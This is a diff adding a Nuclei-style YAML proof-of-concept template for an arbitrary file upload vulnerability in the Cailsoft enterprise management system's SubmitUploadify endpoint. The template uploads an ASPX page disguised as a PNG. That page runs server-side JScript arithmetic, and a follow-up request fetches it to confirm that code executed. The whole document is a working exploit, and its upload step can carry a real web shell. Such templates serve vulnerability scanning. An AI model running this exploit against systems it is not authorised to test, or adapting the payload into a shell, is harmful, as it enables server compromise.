@@ -1,0 +1,57 @@
+id: poc-yaml-cailsoft-submituploadify-upload
+info:
+  name: 赛蓝企业管理系统SubmitUploadify 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(100,1000)}}"
+  t2: "{{rand_int(100,1000)}}"
+  t3: "{{to_number(t1) * to_number(t2)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/EHRModule/EHR_Holidays/SubmitUploadify?FolderId=1&UserId=1"
+    headers:
+      Content-Type: "multipart/form-data; boundary=---------------------------142851345723692939351758052805"
+    body: |-
+      -----------------------------142851345723692939351758052805
+      Content-Disposition: form-data; name="Filedata"; filename="rce.aspx"
+      Content-Type: image/png
+
+      <%@ Page Language="Jscript" validateRequest="false" %>
+      This website has a vulnerability
+      <%Response.Write({{t1}} * {{t2}});%>
+      -----------------------------142851345723692939351758052805--
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "/Resource/UploadFile/AppFiles/(?P<filepath>.*?).aspx"
+    extractors:
+      - type: regex
+        name: filepath
+        internal: true
+        part: body
+        regex:
+          - "/Resource/UploadFile/AppFiles/(?P<filepath>.*?).aspx"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/Resource/UploadFile/AppFiles/{{filepath}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "This website has a vulnerability"
+      - type: dsl
+        dsl:
+          - "contains(body, t3)"
